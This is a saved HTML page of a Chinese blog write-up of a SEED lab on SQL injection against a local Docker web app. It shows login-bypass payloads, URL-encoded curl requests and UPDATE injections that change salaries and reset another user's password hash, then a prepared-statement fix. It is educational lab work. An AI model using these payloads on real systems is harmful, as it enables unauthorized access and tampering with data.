@@ -1,0 +1,780 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>SEEDlab—SQL注入攻击实验 | Smera1d0&#39;s Blog</title>
+<meta name="keywords" content="软件安全">
+<meta name="description" content="环境设置
+修改映射
+将以下条目添加到 etc/hosts 目录下，其中 www.seed-server.com 是Web程序的域名，10.9.0.5 是容器的IP
+10.9.0.5	www.seed-server.com
+构建并启动docker
+
+在Labsetup下使用命令 docker-compose build 构建docker
+
+
+
+使用命令 docker-compose up 拉起容器，容器中的 /var/lib/mysql 挂载在 Labsetup 目录下。
+
+
+Task 1：熟悉 SQL 语句
+进入容器shell并使用mysql客户端与数据库进行交互
+docker ps
+docksh a3
+mysql -u root -pdees
+
+">
+<meta name="author" content="Mi Yu">
+<link rel="canonical" href="https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3-sql-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.c9cbbbc76aa9d1a7b2aae0ded0f3c40bed7459082df7601ab1a59f234f7e0ccc.css" integrity="sha256-ycu7x2qp0aeyquDe0PPEC&#43;10WQgt92AasaWfI09&#43;DMw=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://smera1d0.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://smera1d0.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://smera1d0.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://smera1d0.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://smera1d0.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3-sql-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="SEEDlab—SQL注入攻击实验" />
+<meta property="og:description" content="环境设置
+修改映射
+将以下条目添加到 etc/hosts 目录下，其中 www.seed-server.com 是Web程序的域名，10.9.0.5 是容器的IP
+10.9.0.5	www.seed-server.com
+构建并启动docker
+
+在Labsetup下使用命令 docker-compose build 构建docker
+
+
+
+使用命令 docker-compose up 拉起容器，容器中的 /var/lib/mysql 挂载在 Labsetup 目录下。
+
+
+Task 1：熟悉 SQL 语句
+进入容器shell并使用mysql客户端与数据库进行交互
+docker ps
+docksh a3
+mysql -u root -pdees
+
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3-sql-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/" /><meta property="og:image" content="https://smera1d0.github.io/images/papermod-cover.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-01-12T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-01-12T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://smera1d0.github.io/images/papermod-cover.png"/>
+
+<meta name="twitter:title" content="SEEDlab—SQL注入攻击实验"/>
+<meta name="twitter:description" content="环境设置
+修改映射
+将以下条目添加到 etc/hosts 目录下，其中 www.seed-server.com 是Web程序的域名，10.9.0.5 是容器的IP
+10.9.0.5	www.seed-server.com
+构建并启动docker
+
+在Labsetup下使用命令 docker-compose build 构建docker
+
+
+
+使用命令 docker-compose up 拉起容器，容器中的 /var/lib/mysql 挂载在 Labsetup 目录下。
+
+
+Task 1：熟悉 SQL 语句
+进入容器shell并使用mysql客户端与数据库进行交互
+docker ps
+docksh a3
+mysql -u root -pdees
+
+"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://smera1d0.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "SEEDlab—SQL注入攻击实验",
+      "item": "https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3-sql-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SEEDlab—SQL注入攻击实验",
+  "name": "SEEDlab—SQL注入攻击实验",
+  "description": "环境设置 修改映射 将以下条目添加到 etc/hosts 目录下，其中 www.seed-server.com 是Web程序的域名，10.9.0.5 是容器的IP\n10.9.0.5\twww.seed-server.com 构建并启动docker 在Labsetup下使用命令 docker-compose build 构建docker 使用命令 docker-compose up 拉起容器，容器中的 /var/lib/mysql 挂载在 Labsetup 目录下。 Task 1：熟悉 SQL 语句 进入容器shell并使用mysql客户端与数据库进行交互 docker ps docksh a3 mysql -u root -pdees ",
+  "keywords": [
+    "软件安全"
+  ],
+  "articleBody": "环境设置 修改映射 将以下条目添加到 etc/hosts 目录下，其中 www.seed-server.com 是Web程序的域名，10.9.0.5 是容器的IP\n10.9.0.5\twww.seed-server.com 构建并启动docker 在Labsetup下使用命令 docker-compose build 构建docker 使用命令 docker-compose up 拉起容器，容器中的 /var/lib/mysql 挂载在 Labsetup 目录下。 Task 1：熟悉 SQL 语句 进入容器shell并使用mysql客户端与数据库进行交互 docker ps docksh a3 mysql -u root -pdees 加载数据库并打印数据库中的所有表 使用命令show databases;查看所有数据库： mysql\u003e show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sqllab_users | | sys | +--------------------+ 5 rows in set (0.00 sec) 使用命令use sqllab_users;加载数据库： mysql\u003e use sqllab_users; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u003e show tables; +------------------------+ | Tables_in_sqllab_users | +------------------------+ | credential | +------------------------+ 1 row in set (0.00 sec) 使用命令show tables;打印此数据库的所有表： mysql\u003e show tables;\r+------------------------+\r| Tables_in_sqllab_users |\r+------------------------+\r| credential |\r+------------------------+\r1 row in set (0.00 sec) 使用命令打印员工 Alice 的所有资料信息 使用命令SELECT * from credential;打印整个表单： ​\t发现Alice在Name表项下，ID为1。\n使用命令SELECT * from credential WHERE Name='Alice'即可打印员工Alice的所有资料： Task 2：基于 SELECT 语句的 SQL 注入攻击 登录界面 使用浏览器访问 www.seed-server.com 进入登录界面，如下：\n使用命令sudo docker cp ec:/var/www/SQL_Injection/unsafe_home.php .可以将登录界面前端代码从docker中拷贝到外部\n登录界面逻辑 $input_uname = $_GET['username']; $input_pwd = $_GET['Password']; $hashed_pwd = sha1($input_pwd); $input_uname：用户输入的用户名\n$input_pwd：用户输入的密码\n$hashed_pwd: 密码的哈希值\n// create a connection $conn = getDB(); // Sql query to authenticate the user $sql = \"SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,nickname,Password FROM credential WHERE name= '$input_uname' and Password='$hashed_pwd'\"; if (!$result = $conn-\u003equery($sql)) { echo \"\"; echo \"\"; echo \"\"; die('There was an error running the query [' . $conn-\u003eerror . ']\\n'); echo \"\"; } 这段代码使用了sql语句查询表中是否有用户名为$input_uname且密码哈希值为$hashed_pwd的表项，如果有则登录成功。\nTask 2.1：基于网页的 SQL 注入攻击 你的任务是以管理员的身份从登录页面登录到 Web 应用程序，这样 你就可以查看所有员工的信息。管理员的用户名是 admin，口令未知。请在用户名与口令输入框中输入 能成功完成攻击的内容。\n1. 利用 OR 我们可以构造 admin' OR '1=1 作为我们的登录用户名，这样Sql查询语句就变成了:\nSELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,nickname,Password FROM credential WHERE name= 'admin' OR '1'='1' and Password='$hashed_pwd' 在Sql查询中，只要OR的前半部分为真，整个查询就为真，name='admin'为真，于是会直接跳过密码哈希值的判断部分，进而登录成功。\n2. 利用注释 我们可以构造 admin' -- 或admin' #作为用户名,这样后面的语句就会被注释掉：\nWHERE name= 'admin' -- and Password='$hashed_pwd' WHERE name= 'admin' #and Password='$hashed_pwd' 这样也会跳过密码哈希值的判断。\nTask 2.2：基于命令行的 SQL 注入攻击 在不使用网页的情况下完成 Task 2.1 的目标。你可以使用命令行 工具，如 curl，它可以发送 HTTP 请求。如需在 HTTP 请求中包含多个参数，需要把 URL 和参数用一对 单引号括起来。否则，用于分隔参数的特殊字符 (如 \u0026) 会被 shell 曲解，造成命令歧义。\n将 Task 2.1 的命令中的 #，空格，’,进行 URL 编码\n# space ' %23 %20 %27 curl 'www.seed-server.com/unsafe_home.php?username=admin%27%20OR%20%271=1\u0026Password=' curl 'www.seed-server.com/unsafe_home.php?username=admin%27%23\u0026Password=' curl 'www.seed-server.com/unsafe_home.php?username=admin%27%20--%20\u0026Password=' 以上三条命令执行后都能登录成功并且回显出表单内容\nTask 2.3：增加一条新的 SQL 语句 admin'; DELETE FROM credential WHERE name='admin';# 尝试执行第二条 SQL 语句 DELETE FROM credential WHERE name='admin'; 删除 admin 表项，但是注入失败：\n原因： 查阅 SEED BOOK 后发现和 PHP 中 mysqli 拓展的 query() 函数有关，query()不允许在数据库服务器中运行多条语句，这是为了防止恶意用户通过 SQL 注入攻击执行额外的恶意 SQL 操作。即使攻击者在注入的输入中添加了分号，数据库也不会执行多条sql语句，会直接抛出错误。\nTask 3：基于 UPDATE 语句的 SQL 注入攻击 当员工通过编辑界面编辑他们的信息时，是通过如下的SQL语句更新表单内容的，在 unsafe_edit_backend.php 文件中实现的 PHP 代码用于更新员工的个人信息：\n$conn = getDB(); // Don't do this, this is not safe against SQL injection attack $sql=\"\"; if($input_pwd!=''){ // In case password field is not empty. $hashed_pwd = sha1($input_pwd); //Update the password stored in the session. $_SESSION['pwd']=$hashed_pwd; $sql = \"UPDATE credential SET nickname='$input_nickname',email='$input_email',address='$input_address',Password='$hashed_pwd',PhoneNumber='$input_phonenumber' where ID=$id;\"; }else{ // if passowrd field is empty. $sql = \"UPDATE credential SET nickname='$input_nickname',email='$input_email',address='$input_address',PhoneNumber='$input_phonenumber' where ID=$id;\"; } $conn-\u003equery($sql); 可以发现代码是通过执行一个sql语句进行表单的更新：\nUPDATE credential SET nickname='$input_nickname',email='$input_email',address='$input_address',Password='$hashed_pwd',PhoneNumber='$input_phonenumber' where ID=$id; Task 3.1：修改自己的工资 编辑页面中只能修改员工的昵称、电子邮件、地址、电话号码和口令，而不能用于修改工资。假设你 (Alice) 由于老板 Boby 今年未给你加薪而感到不满。你想利用存在于编辑页面的 SQL 注入漏洞来增加自己的工资。请展示你是如何实现这一目标的。已知列 salary 用于存储工资数额。\n由于 PhoneNumber 是修改的最后一项，于是我们可以在 PhoneNumber 这里注入：\n填入 ',salary=99999 WHERE name='Alice' # ，相当于执行了：\nUPDATE credential SET nickname='',email='',address='',Password='$hashed_pwd',PhoneNumber='',salary=99999 where name='Alice' #' where ID=$id; ; 这会把 Alice 的 Salary 表项改成 99999：\nTask 3.2：修改他人的工资 在提高自己的工资数额后，你决定惩罚你的老板 Boby，将他的工资减少到 1 美元。请展示你是如何实现这一目标的。\n在 PhoneNumber 项填入 ',salary=1 WHERE name='Boby' #，相当于执行了：\nUPDATE credential SET nickname='$input_nickname',email='$input_email',address='$input_address',Password='$hashed_pwd',PhoneNumber='',salary=1 WHERE name='Boby' #' where ID=$id; 这会将 Boby 的工资表项更新成 1\nTask 3.3：修改他人的口令 修改完 Boby 的工资后，你仍心有不甘，所以你想修改 Boby 的口令，这样你就可以登录他的账户，做进一步的破坏。\n由于 Password 在数据库中是以 SHA1 哈希后的哈希值存储的，如果我想把 Boby 的 Password 改为88888888，我就要将数据库中 Boby 对应的 Password 改为 SHA1(88888888)。\n通过 CyberChef 计算出哈希后的值：\n在 PhoneNumber 项填入 ',Password='05b530ad0fb56286fe051d5f8be5b8453f1cd93f' WHERE name='Boby' #，这会修改 Boby 的数据库中的 Password 值：\n现在我们再尝试使用密码 88888888 登录，发现登录成功：\nTask 4：对策：语句预处理 请使用语句预处理机制来修复 SQL 注入漏洞。为了简单起见，我们在文件夹 defense 内创建了一 个简化程序，你需要对这个文件夹中的文件进行修改。\n修改代码 修改 www 容器中的 /var/www/SQL_Injection/defense/ 文件夹下的 unsafe.php 文件，修改后的文件如下所示：\n\u003c?php // Function to create a sql connection. function getDB() { $dbhost=\"10.9.0.6\"; $dbuser=\"seed\"; $dbpass=\"dees\"; $dbname=\"sqllab_users\"; // Create a DB connection $conn = new mysqli($dbhost, $dbuser, $dbpass, $dbname); if ($conn-\u003econnect_error) { die(\"Connection failed: \" . $conn-\u003econnect_error . \"\\n\"); } return $conn; } $input_uname = $_GET['username']; $input_pwd = $_GET['Password']; $hashed_pwd = sha1($input_pwd); // create a connection $conn = getDB(); // Use prepared statements to prevent SQL injection $stmt = $conn-\u003eprepare(\"SELECT id, name, eid, salary, ssn FROM credential WHERE name = ? AND Password = ?\"); if ($stmt) { // Bind parameters (s - string, i - int, d - double, b - blob) $stmt-\u003ebind_param(\"ss\", $input_uname, $hashed_pwd); // Execute the statement $stmt-\u003eexecute(); // Get the result $result = $stmt-\u003eget_result(); if ($result-\u003enum_rows \u003e 0) { // only take the first row $firstrow = $result-\u003efetch_assoc(); $id = $firstrow[\"id\"]; $name = $firstrow[\"name\"]; $eid = $firstrow[\"eid\"]; $salary = $firstrow[\"salary\"]; $ssn = $firstrow[\"ssn\"]; } // Close the statement $stmt-\u003eclose(); } // close the sql connection $conn-\u003eclose(); ?\u003e 使用准备好的语句（Prepared Statements）：通过 $conn-\u003eprepare() 函数创建查询，并使用 ? 占位符来防止直接插入用户输入内容。 绑定参数：使用 $stmt-\u003ebind_param() 函数，将用户输入的参数绑定到准备好的语句中。这种做法确保了SQL查询不会直接拼接用户输入，从而避免SQL注入风险。其中 \"ss\" 表示 $input_uname 和 $hashed_pwd 都是字符串类型。 测试 访问 http://www.seed-server.com/defense 再使用 Alice' # 对 USERNAME 进行 SQL 注入测试：\n发现已经无法查询到 Alice 的信息了。\n思考题 为了防止 C 程序在调用外部程序时出现代码注入攻击，我们不应该使用 system()，而应使用 execve()。请描述这种防御措施与防御 SQL 注入攻击的预处理语句之间的相似性。\n1. system() vs execve() 防御代码注入 在 C 语言中使用 system() 调用外部程序时，用户输入直接作为 shell 命令的一部分，如果用户输入中包含特殊字符或命令，就可能导致代码注入攻击。 而 execve() 是更安全的选择，因为它直接调用外部程序，而不使用 shell。这意味着它不会将输入当作 shell 命令进行解析，避免了恶意输入的执行。 2. SQL 预处理语句防御 SQL 注入 在 SQL 查询中，如果直接将用户输入插入到查询字符串中，恶意用户可以利用输入中的特殊字符来构造有害的 SQL 语句，导致 SQL 注入攻击。 使用 SQL 预处理语句可以防止这种情况发生。预处理语句将查询结构与参数分开，参数通过安全绑定方式插入，不会被当作 SQL 代码解析，避免了攻击。 两者的相似性 两者都采用了分离用户输入和实际代码执行的方式，从而防止了恶意代码注入。 execve() 通过直接调用程序避免了 shell 的解析，而预处理语句通过绑定参数避免了 SQL 解析。 在本质上，这些防御措施都是为了避免将用户输入直接传递给解释器或执行环境，从而避免潜在的注入攻击。 ",
+  "wordCount" : "2929",
+  "inLanguage": "zh",
+  "datePublished": "2024-01-12T00:00:00Z",
+  "dateModified": "2024-01-12T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Mi Yu"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3-sql-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Smera1d0's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://smera1d0.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://smera1d0.github.io/" accesskey="h" title="Smera1d0&#39;s Blog (Alt + H)">Smera1d0&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                    <li>
+                        <a href="https://smera1d0.github.io/en/" title="English"
+                            aria-label="English">English</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://smera1d0.github.io/archives" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://smera1d0.github.io/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://smera1d0.github.io/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://github.com/adityatelange/hugo-PaperMod/wiki/" title="WiKi">
+                    <span>WiKi</span>&nbsp;
+                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
+                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14L21 3"></path>
+                    </svg>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://smera1d0.github.io/">主页</a>&nbsp;»&nbsp;<a href="https://smera1d0.github.io/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      SEEDlab—SQL注入攻击实验
+    </h1>
+    <div class="post-meta"><span title='2024-01-12 00:00:00 +0000 UTC'>一月 12, 2024</span>&nbsp;·&nbsp;6 分钟&nbsp;·&nbsp;Mi Yu&nbsp;|&nbsp;<a href="https://github.com/smera1d0/smera1d0.github.io/tree/main/posts/posts/%e3%80%90%e8%bd%af%e4%bb%b6%e5%ae%89%e5%85%a8%e3%80%91%e5%ae%9e%e9%aa%8c3%20SQL%20%e6%b3%a8%e5%85%a5%e6%94%bb%e5%87%bb%e5%ae%9e%e9%aa%8c.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">目录</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#%e7%8e%af%e5%a2%83%e8%ae%be%e7%bd%ae" aria-label="环境设置">环境设置</a><ul>
+                        
+                <li>
+                    <a href="#%e4%bf%ae%e6%94%b9%e6%98%a0%e5%b0%84" aria-label="修改映射">修改映射</a></li>
+                <li>
+                    <a href="#%e6%9e%84%e5%bb%ba%e5%b9%b6%e5%90%af%e5%8a%a8docker" aria-label="构建并启动docker">构建并启动docker</a></li></ul>
+                </li>
+                <li>
+                    <a href="#task-1%e7%86%9f%e6%82%89-sql-%e8%af%ad%e5%8f%a5" aria-label="Task 1：熟悉 SQL 语句">Task 1：熟悉 SQL 语句</a><ul>
+                        
+                <li>
+                    <a href="#%e8%bf%9b%e5%85%a5%e5%ae%b9%e5%99%a8shell%e5%b9%b6%e4%bd%bf%e7%94%a8mysql%e5%ae%a2%e6%88%b7%e7%ab%af%e4%b8%8e%e6%95%b0%e6%8d%ae%e5%ba%93%e8%bf%9b%e8%a1%8c%e4%ba%a4%e4%ba%92" aria-label="进入容器shell并使用mysql客户端与数据库进行交互">进入容器shell并使用mysql客户端与数据库进行交互</a></li>
+                <li>
+                    <a href="#%e5%8a%a0%e8%bd%bd%e6%95%b0%e6%8d%ae%e5%ba%93%e5%b9%b6%e6%89%93%e5%8d%b0%e6%95%b0%e6%8d%ae%e5%ba%93%e4%b8%ad%e7%9a%84%e6%89%80%e6%9c%89%e8%a1%a8" aria-label="加载数据库并打印数据库中的所有表">加载数据库并打印数据库中的所有表</a></li>
+                <li>
+                    <a href="#%e4%bd%bf%e7%94%a8%e5%91%bd%e4%bb%a4%e6%89%93%e5%8d%b0%e5%91%98%e5%b7%a5-alice-%e7%9a%84%e6%89%80%e6%9c%89%e8%b5%84%e6%96%99%e4%bf%a1%e6%81%af" aria-label="使用命令打印员工 Alice 的所有资料信息">使用命令打印员工 Alice 的所有资料信息</a></li></ul>
+                </li>
+                <li>
+                    <a href="#task-2%e5%9f%ba%e4%ba%8e-select-%e8%af%ad%e5%8f%a5%e7%9a%84-sql-%e6%b3%a8%e5%85%a5%e6%94%bb%e5%87%bb" aria-label="Task 2：基于 SELECT 语句的 SQL 注入攻击">Task 2：基于 SELECT 语句的 SQL 注入攻击</a><ul>
+                        
+                <li>
+                    <a href="#%e7%99%bb%e5%bd%95%e7%95%8c%e9%9d%a2" aria-label="登录界面">登录界面</a></li>
+                <li>
+                    <a href="#%e7%99%bb%e5%bd%95%e7%95%8c%e9%9d%a2%e9%80%bb%e8%be%91" aria-label="登录界面逻辑">登录界面逻辑</a></li>
+                <li>
+                    <a href="#task-21%e5%9f%ba%e4%ba%8e%e7%bd%91%e9%a1%b5%e7%9a%84-sql-%e6%b3%a8%e5%85%a5%e6%94%bb%e5%87%bb" aria-label="Task 2.1：基于网页的 SQL 注入攻击">Task 2.1：基于网页的 SQL 注入攻击</a><ul>
+                        
+                <li>
+                    <a href="#1-%e5%88%a9%e7%94%a8-or" aria-label="1. 利用 OR">1. 利用 OR</a></li>
+                <li>
+                    <a href="#2-%e5%88%a9%e7%94%a8%e6%b3%a8%e9%87%8a" aria-label="2. 利用注释">2. 利用注释</a></li></ul>
+                </li>
+                <li>
+                    <a href="#task-22%e5%9f%ba%e4%ba%8e%e5%91%bd%e4%bb%a4%e8%a1%8c%e7%9a%84-sql-%e6%b3%a8%e5%85%a5%e6%94%bb%e5%87%bb" aria-label="Task 2.2：基于命令行的 SQL 注入攻击">Task 2.2：基于命令行的 SQL 注入攻击</a></li>
+                <li>
+                    <a href="#task-23%e5%a2%9e%e5%8a%a0%e4%b8%80%e6%9d%a1%e6%96%b0%e7%9a%84-sql-%e8%af%ad%e5%8f%a5" aria-label="Task 2.3：增加一条新的 SQL 语句">Task 2.3：增加一条新的 SQL 语句</a><ul>
+                        
+                <li>
+                    <a href="#%e5%8e%9f%e5%9b%a0" aria-label="原因：">原因：</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#task-3%e5%9f%ba%e4%ba%8e-update-%e8%af%ad%e5%8f%a5%e7%9a%84-sql-%e6%b3%a8%e5%85%a5%e6%94%bb%e5%87%bb" aria-label="Task 3：基于 UPDATE 语句的 SQL 注入攻击">Task 3：基于 UPDATE 语句的 SQL 注入攻击</a><ul>
+                        
+                <li>
+                    <a href="#task-31%e4%bf%ae%e6%94%b9%e8%87%aa%e5%b7%b1%e7%9a%84%e5%b7%a5%e8%b5%84" aria-label="Task 3.1：修改自己的工资">Task 3.1：修改自己的工资</a></li>
+                <li>
+                    <a href="#task-32%e4%bf%ae%e6%94%b9%e4%bb%96%e4%ba%ba%e7%9a%84%e5%b7%a5%e8%b5%84" aria-label="Task 3.2：修改他人的工资">Task 3.2：修改他人的工资</a></li>
+                <li>
+                    <a href="#task-33%e4%bf%ae%e6%94%b9%e4%bb%96%e4%ba%ba%e7%9a%84%e5%8f%a3%e4%bb%a4" aria-label="Task 3.3：修改他人的口令">Task 3.3：修改他人的口令</a></li></ul>
+                </li>
+                <li>
+                    <a href="#task-4%e5%af%b9%e7%ad%96%e8%af%ad%e5%8f%a5%e9%a2%84%e5%a4%84%e7%90%86" aria-label="Task 4：对策：语句预处理">Task 4：对策：语句预处理</a><ul>
+                        
+                <li>
+                    <a href="#%e4%bf%ae%e6%94%b9%e4%bb%a3%e7%a0%81" aria-label="修改代码">修改代码</a></li>
+                <li>
+                    <a href="#%e6%b5%8b%e8%af%95" aria-label="测试">测试</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e6%80%9d%e8%80%83%e9%a2%98" aria-label="思考题">思考题</a><ul>
+                        
+                <li>
+                    <a href="#1-system-vs-execve-%e9%98%b2%e5%be%a1%e4%bb%a3%e7%a0%81%e6%b3%a8%e5%85%a5" aria-label="1. system() vs execve() 防御代码注入">1. system() vs execve() 防御代码注入</a></li>
+                <li>
+                    <a href="#2-sql-%e9%a2%84%e5%a4%84%e7%90%86%e8%af%ad%e5%8f%a5%e9%98%b2%e5%be%a1-sql-%e6%b3%a8%e5%85%a5" aria-label="2. SQL 预处理语句防御 SQL 注入">2. SQL 预处理语句防御 SQL 注入</a></li>
+                <li>
+                    <a href="#%e4%b8%a4%e8%80%85%e7%9a%84%e7%9b%b8%e4%bc%bc%e6%80%a7" aria-label="两者的相似性">两者的相似性</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="环境设置">环境设置<a hidden class="anchor" aria-hidden="true" href="#环境设置">#</a></h2>
+<h3 id="修改映射">修改映射<a hidden class="anchor" aria-hidden="true" href="#修改映射">#</a></h3>
+<p>将以下条目添加到 <code>etc/hosts</code> 目录下，其中 <code>www.seed-server.com</code> 是Web程序的域名，<code>10.9.0.5</code> 是容器的IP</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="m">10.9.0.5</span><span class="w">	</span><span class="l">www.seed-server.com</span><span class="w">
+</span></span></span></code></pre></div><h3 id="构建并启动docker">构建并启动docker<a hidden class="anchor" aria-hidden="true" href="#构建并启动docker">#</a></h3>
+<ol>
+<li>在<code>Labsetup</code>下使用命令 <code>docker-compose build</code> 构建docker</li>
+</ol>
+<img src="https://s2.loli.net/2024/10/23/DAYObt7uPgqWsBv.png" alt="image-20241023085326893" style="zoom: 50%;" />
+<ol start="2">
+<li>使用命令 <code>docker-compose up</code> 拉起容器，容器中的 <code>/var/lib/mysql</code> 挂载在 <code>Labsetup</code> 目录下。</li>
+</ol>
+<img src="https://s2.loli.net/2024/10/23/mHyO4TSWMEpYlxJ.png" alt="image-20241023090817956" style="zoom: 33%;" />
+<h2 id="task-1熟悉-sql-语句">Task 1：熟悉 SQL 语句<a hidden class="anchor" aria-hidden="true" href="#task-1熟悉-sql-语句">#</a></h2>
+<h3 id="进入容器shell并使用mysql客户端与数据库进行交互">进入容器shell并使用mysql客户端与数据库进行交互<a hidden class="anchor" aria-hidden="true" href="#进入容器shell并使用mysql客户端与数据库进行交互">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">docker ps
+</span></span><span class="line"><span class="cl">docksh a3
+</span></span><span class="line"><span class="cl">mysql -u root -pdees
+</span></span></code></pre></div><p><img loading="lazy" src="https://s2.loli.net/2024/10/23/vLGOnWEDS6B5wsf.png" alt="image-20241023092314024"  />
+</p>
